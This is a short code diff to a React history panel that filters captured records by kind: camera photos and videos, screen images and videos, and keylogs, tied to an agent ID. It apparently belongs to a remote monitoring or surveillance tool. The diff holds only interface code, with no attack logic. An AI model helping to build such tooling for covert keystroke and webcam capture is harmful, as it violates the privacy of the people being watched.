@@ -77,10 +77,13 @@ export default function HistoryPanel({ open, onClose, agentId: fixedAgentId }: {
       </div>
       <div style={{ padding: 10, display: 'flex', flexDirection: 'column', gap: 10, height: 'calc(100% - 48px)' }}>
         <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
-          <select className="input" style={{ width: 150 }} value={kind} onChange={(e)=>setKind(e.target.value)}>
+          <select className="input" style={{ width: 180 }} value={kind} onChange={(e)=>setKind(e.target.value)}>
             <option value="">(all kinds)</option>
-            <option value="camera">camera</option>
-            <option value="screen">screen</option>
+            <option value="camera_image">camera photos</option>
+            <option value="camera_photo">camera photos (manual)</option>
+            <option value="camera_video">camera videos</option>
+            <option value="screen_image">screen images</option>
+            <option value="screen_video">screen videos</option>
             <option value="keylog">keylog</option>
           </select>
           {!fixedAgentId ? (
